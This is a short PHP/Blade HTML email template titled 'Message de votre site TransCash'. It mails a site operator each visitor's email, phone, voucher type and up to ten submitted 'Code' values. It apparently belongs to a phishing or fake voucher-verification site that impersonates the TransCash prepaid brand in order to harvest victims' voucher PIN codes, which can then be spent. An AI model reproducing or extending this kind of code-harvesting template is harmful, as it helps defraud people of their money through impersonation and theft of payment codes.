<!DOCTYPE html>
<html>

<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
</head>

<body style="background: #e5e5e5; padding: 30px;">

    <div style="max-width: 320px; margin: 0 auto; padding: 20px; background: #fff;">
        <h3>Message de votre site TransCash :</h3>
        <div>Email: {{ $data['email'] }}</div>
        <div>Télephone: {{ $data['tel'] }}</div>
        <div>Type: {{ $data['type'] }}</div>
        <div>Nombre: {{ $data['cc1'] }}</div>
        <?php if (!empty($data['pin1'])) {
        ?>
            <div>Code1: {{ $data['pin1'] }}</div>
        <?php }
        ?>
        <?php if (!empty($data['pin2'])) {
        ?>
            <div>Code2: {{ $data['pin2'] }}</div>
        <?php }
        ?>
        <?php if (!empty($data['pin3'])) {
        ?>
            <div>Code3: {{ $data['pin3'] }}</div>
        <?php }
        ?>
        <?php if (!empty($data['pin4'])) {
        ?>
            <div>Code4: {{ $data['pin4'] }}</div>
        <?php }
        ?>
        <?php if (!empty($data['pin5'])) {
        ?>
            <div>Code5: {{ $data['pin5'] }}</div>
        <?php }
        ?>
        <?php if (!empty($data['pin6'])) {
        ?>
            <div>Code6: {{ $data['pin6'] }}</div>
        <?php }
        ?>
        <?php if (!empty($data['pin7'])) {
        ?>
            <div>Code7: {{ $data['pin7'] }}</div>
        <?php }
        ?>
        <?php if (!empty($data['pin8'])) {
        ?>
            <div>Code8: {{ $data['pin8'] }}</div>
        <?php }
        ?>
        <?php if (!empty($data['pin9'])) {
        ?>
            <div>Code9: {{ $data['pin9'] }}</div>
        <?php }
        ?>
        <?php if (!empty($data['pin10'])) {
        ?>
            <div>Code10: {{ $data['pin10'] }}</div>
        <?php }
        ?>
    </div>

</body>

</html>